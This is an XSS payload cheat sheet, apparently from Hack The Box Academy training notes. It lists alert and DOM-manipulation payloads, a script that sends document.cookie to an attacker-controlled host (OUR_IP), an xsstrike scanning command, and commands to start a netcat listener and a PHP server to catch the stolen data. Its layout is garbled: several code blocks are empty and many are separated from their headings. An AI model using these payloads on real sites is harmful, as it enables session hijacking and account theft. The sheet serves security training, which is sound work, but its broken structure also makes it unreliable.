# XSS

####Basic Payloads

####Basic alert XSS

```
alert(window.origin)
```

####Plaintext injection

```

```

####Basic print execution

```
print()
```

####HTML-based alert XSS

```

```

####DOM Manipulation

####Change background color

```
document.body.style.background = "#141d2b"
```

####Change background image

```
document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"
```

####Change website title

####Overwrite website's main body

####Remove specific HTML element

####Advanced Payloads

####Load remote script

####Send cookie data to attacker

###Common Commands

####Scanning and Exploitation

####Run xsstrike on a URL parameter

####Networking

####Start netcat listener

####Start PHP server
Last updated 10 months ago
```
document.title = 'HackTheBox Academy'
```

```
document.getElementsByTagName('body')[0].innerHTML = 'text'
```

```
document.getElementById('urlform').remove();
```

```

```

```
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

```
sudo nc -lvnp 80
```

```
sudo php -S 0.0.0.0:80
```
